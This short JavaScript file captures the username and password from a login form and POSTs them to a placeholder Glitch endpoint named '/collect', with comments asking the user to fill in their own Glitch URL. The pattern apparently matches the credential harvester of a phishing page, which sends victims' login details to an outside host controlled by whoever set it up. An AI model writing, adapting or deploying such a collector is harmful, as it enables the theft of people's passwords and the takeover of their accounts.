document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    // Get values from the form fields
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Replace this with your actual Glitch URL!
    const endpoint = 'https://your-glitch-project-name.glitch.me/collect';

    // Send username and password to your backend
    fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
    })
    .then(response => {
        // Optionally handle the response or redirect
        // For example, redirect to a dashboard:
        // window.location.href = "/dashboard.html";
    })
    .catch(error => {
        // Optionally handle errors
        console.error('Error sending credentials:', error);
    });
});